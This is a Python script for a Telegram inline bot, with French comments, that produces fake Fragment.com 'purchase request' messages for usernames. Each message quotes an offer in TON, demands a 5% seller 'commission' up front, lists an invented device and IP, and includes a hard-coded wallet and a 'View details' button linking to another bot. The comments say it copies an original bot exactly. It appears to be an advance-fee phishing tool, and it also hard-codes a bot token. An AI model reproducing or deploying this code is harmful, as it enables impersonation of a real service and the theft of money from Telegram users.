import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"🤖 Inline Fragment Deal Generator v4.4")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON"""
    try:
        url = "https://api.diedia.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            return float(data.get('Price', 5.50))
    except:
        return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
    
    # 5. Wallet cliquable
    wallet_start = fragment_message.find(wallet_address)
    if wallet_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.TEXT_LINK,
            offset=wallet_start,
            length=len(wallet_address),
            url=f"https://tonviewer.com/{wallet_address}"
        ))
    
    # URL du bouton - identique au bot original
    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
    
    # Bouton - identique au bot original
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", url=button_url)]])
    
    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        
        # Instructions par défaut si pas de requête
        if not query:
            results = [
                InlineQueryResultArticle(
                    id="help",
                    title="📝 Comment utiliser ce bot",
                    description="Tapez: username montant_ton",
                    input_message_content=InputTextMessageContent(
                        "ℹ️ **Utilisation du bot:**\n\nTapez: `@votre_bot username montant_ton`\n\n**Exemple:** `@votre_bot johndoe 150`",
                        parse_mode="Markdown"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        
        if len(parts) < 2:
            results = [
                InlineQueryResultArticle(
                    id="error_format",
                    title="❌ Format incorrect",
                    description="Format attendu: username montant_ton",
                    input_message_content=InputTextMessageContent(
                        "❌ **Format incorrect**\n\nUtilisez: `username montant_ton`\n\n**Exemple:** `johndoe 150`",
                        parse_mode="Markdown"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
        except ValueError:
            results = [
                InlineQueryResultArticle(
                    id="error_amount",
                    title="❌ Montant invalide",
                    description="Le montant doit être un nombre positif",
                    input_message_content=InputTextMessageContent(
                        "❌ **Montant invalide**\n\nLe montant en TON doit être un nombre positif.\n\n**Exemple:** `johndoe 150`",
                        parse_mode="Markdown"
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=0)
            return
        
        # Génération du message avec le format exact du bot original
        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
        
        # Résultat inline
        results = [
            InlineQueryResultArticle(
                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                title=f"Fragment Deal: @{username}",
                description=f"💎 {ton_amount:g} TON (${ton_amount * get_ton_price():.2f} USD)",
                input_message_content=InputTextMessageContent(
                    fragment_message,
                    entities=entities
                ),
                reply_markup=keyboard
            )
        ]
        
        await update.inline_query.answer(results, cache_time=0)
        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")
        
    except Exception as e:
        print(f"❌ Erreur dans inline_query_handler: {e}")
        # Réponse d'erreur générique
        try:
            from telegram import InlineQueryResultArticle, InputTextMessageContent
            error_results = [
                InlineQueryResultArticle(
                    id=f"error_{int(time.time())}",
                    title="❌ Erreur interne",
                    description="Une erreur s'est produite",
                    input_message_content=InputTextMessageContent(
                        "❌ **Erreur interne**\n\nUne erreur s'est produite lors de la génération du message.",
                        parse_mode="Markdown"
                    )
                )
            ]
            await update.inline_query.answer(error_results, cache_time=0)
        except Exception as fallback_error:
            print(f"❌ Erreur fallback: {fallback_error}")

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire webhook HTTP simple"""
    
    def do_POST(self):
        """Gestion des requêtes POST"""
        global app, event_loop
        
        try:
            if self.path != f'/{BOT_TOKEN}':
                self.send_response(404)
                self.end_headers()
                return
            
            # Lecture des données
            content_length = int(self.headers.get('content-length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse JSON
            update_data = json.loads(post_data.decode('utf-8'))
            
            # Traitement asynchrone
            if app and event_loop:
                asyncio.run_coroutine_threadsafe(
                    process_update(update_data),
                    event_loop
                )
            
            # Réponse OK
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        html = f"""<!DOCTYPE html>
<html>
<head><title>Inline Fragment Bot</title></head>
<body>
    <h1>🤖 Inline Fragment Deal Generator</h1>
    <p><strong>Status:</strong> ✅ Online</p>
    <p><strong>Mode:</strong> Webhook</p>
    <p><strong>Port:</strong> {PORT}</p>
    <p><strong>Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
    <p><strong>Webhook URL:</strong> {WEBHOOK_URL}/{BOT_TOKEN}</p>
</body>
</html>"""
        
        self.wfile.write(html.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

async def process_update(update_data):
    """Traitement des updates Telegram"""
    global app
    
    try:
        if app:
            update = Update.de_json(update_data, app.bot)
            if update:
                await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement update: {e}")

def run_webhook_server():
    """Démarre le serveur webhook"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur webhook: {e}")

async def setup_bot():
    """Configuration du bot"""
    global app, event_loop
    
    try:
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout du gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Initialisation
        await app.initialize()
        await app.start()
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        await app.bot.set_webhook(url=webhook_url)
        
        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
        
        # Garde l'event loop actif
        event_loop = asyncio.get_event_loop()
        
        # Démarrage du serveur webhook dans un thread séparé
        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
        webhook_thread.start()
        
        # Attente infinie
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup bot: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()
